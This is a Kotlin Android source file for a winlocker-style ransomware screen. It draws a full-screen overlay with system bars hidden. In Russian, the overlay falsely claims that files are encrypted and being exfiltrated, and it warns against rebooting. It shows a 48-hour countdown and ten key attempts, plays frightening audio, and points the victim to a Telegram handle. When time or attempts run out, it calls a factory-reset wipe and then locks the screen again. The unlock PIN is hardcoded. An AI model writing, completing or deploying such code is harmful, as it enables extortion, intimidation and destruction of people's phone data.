package com.rocket.deadlinelock

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.drawable.GradientDrawable
import android.os.Handler
import android.os.Looper
import android.os.Vibrator
import android.os.VibrationEffect
import android.view.Gravity
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView

class LockOverlay(private val context: Context) {
    private val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
    private val handler = Handler(Looper.getMainLooper())
    private val music = ScaryMusic()
    private val voice = ScaryVoice(context)

    private var view: LinearLayout? = null
    private var timerText: TextView? = null
    private var attemptsText: TextView? = null
    private var input: EditText? = null
    private var btn: Button? = null

    private val correctPin = "137117295"
    private var attemptsLeft = 10
    private var secondsLeft = 48 * 60 * 60 
    private var lockedOut = false

    private val tick = object : Runnable {
        override fun run() {
            if (lockedOut) return
            secondsLeft--
            if (secondsLeft <= 0) {
                timerText?.text = "ВРЕМЯ ВЫШЛО"
                goBlackout()
                return
            }
            
            val h = secondsLeft / 3600
            val m = (secondsLeft % 3600) / 60
            val s = secondsLeft % 60
            timerText?.text = String.format("%02d:%02d:%02d", h, m, s)
            
            handler.postDelayed(this, 1000)
        }
    }

    fun show() {
        if (view != null) return
        
        // 1. Главный фон (Ярко-красный)
        val root = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#CC0000")) // Красный фон
            setPadding(30, 30, 30, 30)
        }

        // 2. Центральный прямоугольник (Темно-серый, как в ПК-винлокерах)
        val box = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(40, 40, 40, 40)
            
            // Рисуем рамку и темный фон для плашки
            val bg = GradientDrawable().apply {
                setColor(Color.parseColor("#1A1A1A")) // Почти черный
                setStroke(4, Color.WHITE) // Белая рамка
                cornerRadius = 10f // Слегка скругленные углы
            }
            background = bg
        }

        // Заголовок
        val title = TextView(context).apply {
            text = "!!! СИСТЕМА ЗАБЛОКИРОВАНА !!!"
            setTextColor(Color.RED)
            textSize = 22f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 15)
        }

        // Предупреждение 1
        val warn1 = TextView(context).apply {
            text = "Все ваши файлы зашифрованы и отправляются в сеть."
            setTextColor(Color.WHITE)
            textSize = 16f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 10)
        }

        // Предупреждение 2
        val warn2 = TextView(context).apply {
            text = "НЕ ПЕРЕЗАГРУЖАЙТЕ ТЕЛЕФОН!\nПри попытке перезагрузки он будет заблокирован навсегда."
            setTextColor(Color.parseColor("#FFAAAA"))
            textSize = 14f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 20)
        }

        // Таймер
        val timerTitle = TextView(context).apply {
            text = "ДО СБРОСА ДО ЗАВОДСКИХ НАСТРОЕК:"
            setTextColor(Color.LTGRAY)
            textSize = 14f
            gravity = Gravity.CENTER
        }

        timerText = TextView(context).apply {
            text = "48:00:00"
            setTextColor(Color.YELLOW)
            textSize = 36f
            gravity = Gravity.CENTER
            setPadding(0, 5, 0, 20)
        }

        // Попытки
        val attemptsTitle = TextView(context).apply {
            text = "ПОПЫТОК ВВОДА:"
            setTextColor(Color.LTGRAY)
            textSize = 14f
            gravity = Gravity.CENTER
        }

        attemptsText = TextView(context).apply {
            text = "10"
            setTextColor(Color.WHITE)
            textSize = 22f
            gravity = Gravity.CENTER
            setPadding(0, 5, 0, 20)
        }

        // Поле ввода
        input = EditText(context).apply {
            hint = "ВВЕДИТЕ КЛЮЧ"
            setTextColor(Color.WHITE)
            setHintTextColor(Color.GRAY)
            gravity = Gravity.CENTER
            textSize = 18f
            inputType = android.text.InputType.TYPE_CLASS_TEXT or
                    android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
            
            val bg = GradientDrawable().apply {
                setColor(Color.parseColor("#333333"))
                setStroke(2, Color.GRAY)
                cornerRadius = 5f
            }
            background = bg
            setPadding(20, 20, 20, 20)
        }

        // Кнопка
        btn = Button(context).apply {
            text = "ПРОВЕРИТЬ"
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#880000"))
            setPadding(20, 20, 20, 20)
            setOnClickListener { checkPassword() }
        }

        // Кнопки Telegram и VPN (внутри плашки, внизу)
        val tgBtn = Button(context).apply {
            text = "Связаться: TG @qwerty112005"
            setBackgroundColor(Color.TRANSPARENT)
            setTextColor(Color.parseColor("#33AAFF"))
            setOnClickListener {
                if (!AppLauncher.openTelegram(context))
                    attemptsText?.text = "TG не найден"
            }
        }

        val vpnBtn = Button(context).apply {
            text = "Включить VPN"
            setBackgroundColor(Color.TRANSPARENT)
            setTextColor(Color.parseColor("#33AAFF"))
            setOnClickListener {
                if (!AppLauncher.openVpn(context))
                    attemptsText?.text = "VPN не найден"
            }
        }

        // Собираем плашку
        box.addView(title)
        box.addView(warn1)
        box.addView(warn2)
        box.addView(timerTitle)
        box.addView(timerText)
        box.addView(attemptsTitle)
        box.addView(attemptsText)
        box.addView(input)
        box.addView(btn)
        box.addView(tgBtn)
        box.addView(vpnBtn)

        // Добавляем плашку на главный экран
        root.addView(box)

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS, 
            PixelFormat.TRANSLUCENT
        )
        wm.addView(root, params)
        view = root

        // Скрываем системные панели
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            root.windowInsetsController?.hide(android.view.WindowInsets.Type.systemBars())
            root.windowInsetsController?.systemBarsBehavior = android.view.WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        } else {
            @Suppress("DEPRECATION")
            root.systemUiVisibility = android.view.View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or
                    android.view.View.SYSTEM_UI_FLAG_FULLSCREEN or
                    android.view.View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
                    android.view.View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                    android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION or
                    android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
        }

        music.start()
        voice.speak() 
        handler.postDelayed(tick, 1000)
    }

    private fun checkPassword() {
        if (lockedOut) return
        if (input?.text.toString() == correctPin) unlock()
        else {
            attemptsLeft--
            attemptsText?.text = attemptsLeft.toString()
            input?.setText("")
            vibrate(400)
            if (attemptsLeft <= 0) {
                attemptsText?.text = "0 (СБРОС)"
                goBlackout()
            }
        }
    }

    private fun goBlackout() {
        if (lockedOut) return
        lockedOut = true
        handler.removeCallbacksAndMessages(null)
        music.stop()
        voice.stop()
        vibrate(1500)
        hide()
        FactoryReset.wipe(context)
        BlackoutOverlay(context).start {
            attemptsLeft = 10
            lockedOut = false
            secondsLeft = 48 * 60 * 60
            show()
        }
    }

    private fun unlock() {
        handler.removeCallbacksAndMessages(null)
        music.stop()
        voice.stop()
        hide()
    }

    fun hide() {
        view?.let { try { wm.removeView(it) } catch (_: Exception) {} }
        view = null
    }

    private fun vibrate(ms: Long) {
        val v = context.getSystemService(Context.VIBRATOR_SERVICE) as? Vibrator ?: return
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
            v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
        else @Suppress("DEPRECATION") v.vibrate(ms)
    }
}
